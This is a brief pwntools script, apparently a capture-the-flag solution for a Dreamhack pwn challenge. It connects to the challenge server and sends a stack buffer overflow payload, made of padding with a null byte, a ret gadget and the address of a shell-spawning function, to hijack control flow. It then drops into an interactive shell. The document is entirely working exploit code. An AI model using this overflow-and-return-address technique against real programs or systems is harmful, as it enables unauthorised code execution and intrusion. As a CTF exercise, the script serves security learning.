from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 13333
r = remote(HOST, PORT)

sh=0x40125c
ret=0x40101a
r.sendlineafter(b'??\n', b'A'*10)
r.sendlineafter(b': ', b'A'*15+b'\x00'+b'A'*40+p64(ret)+p64(sh))

r.interactive()